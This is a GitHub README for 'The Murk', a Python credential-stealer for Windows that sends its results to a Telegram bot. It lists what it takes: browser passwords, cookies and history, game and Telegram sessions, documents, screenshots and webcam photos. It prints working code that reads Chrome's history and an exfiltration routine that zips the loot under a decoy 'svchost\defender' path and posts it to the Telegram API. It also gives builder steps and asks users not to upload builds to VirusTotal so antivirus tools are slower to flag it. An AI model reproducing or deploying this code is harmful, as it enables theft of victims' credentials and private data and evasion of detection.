<a id ="up"></a>
![LOGO](Images_GitHub/pxfulllogo.png)
<img src="https://img.shields.io/badge/Python-FFD43B?style=for-the-badge&logo=python&logoColor=blue">
<img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white">
<img src="https://img.shields.io/badge/tests-100/100-76B900?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/The%20Murk-v4.5.0-blue?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/platform-windows-989898?style=for-the-badge&logo=&logoColor=whit">


Stealer written on Python, results will be sent to Telegram bot.
[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v5.0.0)

***
### ⛔Disclaimer⛔

I, the creator, am __NOT__ responsible for any actions, and or damages, caused by this software. You __BEAR__ the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software's main purpose is __NOT__ to be used maliciously, or on any system that you do not own, or have the right to use. __By using this software, you automatically agree to the above.__

---
### ❗❗Request❗❗

__Don't upload builded stealer to Virustotal__. The more often you upload it, the more and faster antiviruses begin to recognize its signature.

---
### ❕❕Data grubed❕❕
* ✅System info
    * ⌚Time
    * 💻OS
    * 🔩CPU
        * 📜Cores
        * 📜CPU frequency
    * 📡IP
    * 📡Location
    * 💽RAM
        * 💾Available
        * 💾Used
    * 📜PC name
    * 💽Discs
        * 📜volumes
        * 💾All Memory
        * 💾Available
        * 💾Used
        * 📜File system type
    * 🧪Antiviruses
    * 🎥GPU
        * 🔩Type
        * 💾All memory in the GPU
        * 💾Free memory in the GPU
        * 📜Graphics card temperature
    * 📠Processes
* ✅Files .txt and .docx
    * 📝in Desktop
    * 📝in Documents
    * 📝in Downloads
* ✅Telegram sessions
* ✅Steam, Epic Games sessions
* ✅Browsers
    * 🔗Chrome
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
    * 🔗Firefox
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
    * 🔗Opera
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
* ✅Other
    * 📸Sreenshot
    * 📸Camera photo
---
### 🖼Let's look at the code
__Okay, firstly let's start with TheMurk.py.It's the main code file.__

⇓Here you need to input yor [telegram bot token](https://t.me/BotFather) and than [telegram id](https://t.me/TgramUserIDBot)⇓
```
userTOKEN = ''
userCHAT_ID = ''
```
⇓Here you can see importing a code.py files from scripts folder⇓
```
from scripts.send import make_folder
from scripts.system import system_info
from scripts.system import screenshoot
from scripts.browsers import chrome
from scripts.browsers import opera
from scripts.browsers import firefox
from scripts.another import telegram
from scripts.send import send
from scripts.removal_of_traces import clear
from scripts.another import steam
from scripts.system import Files_txt
```
⇓It's a main piece of code, here is a functions call from the code.py files. To understand it you need to read a code which wrote in code.py files⇓
```
make_folder.makeFolders()
chrome.Chrome()
opera.Opera()
firefox.Firefox()
steam.Steam()
system_info.SystemInfo()
Files_txt.TxtSteal()
telegram.Telegram()
screenshoot.Screenshot()

try:
    clear.makemeZip()
except Exception as e:
    print(e)
try:
    send.Send(userTOKEN,userCHAT_ID)
except Exception as e:
    print(e)
```
There are a lots of files so I'll explain only few of them

__So, code.py files in the scripts directory__

⇓Let's start with system_info.py⇓
```
[you can read it here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/blob/main/scripts/system/system_info.py)
but in short, It takes info about your PC using python libraries and their write it into a .txt file
```
⇓Now its time for chrome.py⇓

⇓Here it try to get chrome history. Firstly get that decrypt and finally write to history-chrome.txt. With passwords and cookies the same algorithm⇓
```
try:
        HistorySQL = "SELECT url FROM visits"
        HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"

        data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default"
        files = os.listdir(data_path)
        history_db = os.path.join(data_path, 'history')
        shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
        c = sqlite3.connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
        cursor = c.cursor()
        temp = []
        with open(rf"C:\windll\Chrome\history-chrome.txt", "a", encoding="utf-8") as history:
            for result in cursor.execute(HistorySQL).fetchall():
                data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
                result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {time(data[2])}\n\n"
                if result in temp:
                    continue
                temp.append(result)
                history.write(result)
            history.close()
        try:
            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
        except:
            pass
```
⇓Now let's look at send.py. First, it gets userTOKEN and userCHAT_ID then look at the folder with results then archive it and sends it to you using a bot⇓
```
def Send(userTOKEN,userCHAT_ID):

	try:
		user = os.environ['USERPROFILE'].replace("C\\Users\\")
	except:
		user = 'The murk'
	archiveOfLogs = rf'windows__cache__\svchost\defender\daksldjlas\dsadsad\sd\dsa\ds\ds\ds\as\dsa\das\ds\sad\das\das\das\dsa\dsa\dsa\das\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\{user}-results.zip'
	userUrl = f'https://api.telegram.org/bot{userTOKEN}/sendDocument?chat_id={userCHAT_ID}'
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
	}
	try:
	    with requests.Session() as session:
	        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
	        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
	        session.post(userUrl,files={"document": open(archiveOfLogs, 'rb')})
	except Exception as e:
	    print(e)

	try:
		shutil.rmtree('windows__cache__\\', ignore_errors=True)
	except Exception as e:
		print(e)
```
__All in all, this code is not hard, maybe in the next few updates I'll add comments to the code__

---
### 🔨Builder

__So firstly you need to download [python](https://www.python.org/downloads/). Secondly you have to download all files from [github](#up).Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v5.0.0) and place in in one folder with previous files. 
Finaly go to the "https://t.me/BotFather" and create your own bot. You need to save token and bot name.
Now you need to get your chat id. To do this, go to the next bot "https://t.me/TgramUserIDBot" and save the id.
Insert this data in builder__

![LOGO](Images_GitHub/builder.png)

---
### ❌Builder errors

If you have error like this:

![error](Images_GitHub/error.png)

How to solve it read [here](https://www.stechies.com/pip-not-recognized-internal-external-command/)

---
### 🧾Results(logs)
![LOGO](Images_GitHub/example.png)
![LOGO](Images_GitHub/example2.jpg)

---
### 💰 Donate
   <a href="https://www.donationalerts.com/r/nick_vinesmoke"><img src="https://img.shields.io/badge/Donationalerts-F37623?style=for-the-badge&logo=Cash%20App&logoColor=white"></a>

---
### 📲Contacts
open [issues](https://github.com/Nick-Vinesmoke/The-Murk-stealer/issues) or [pull requests](https://github.com/Nick-Vinesmoke/The-Murk-stealer/pulls)

or 

<a href="https://github.com/Nick-Vinesmoke"><img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white"></a>
   <a href="https://discordapp.com/users/798503509522645012/"><img src="https://img.shields.io/badge/Discord-003E54?style=for-the-badge&logo=Discord&logoColor=white"></a>
---
[go up](#up)
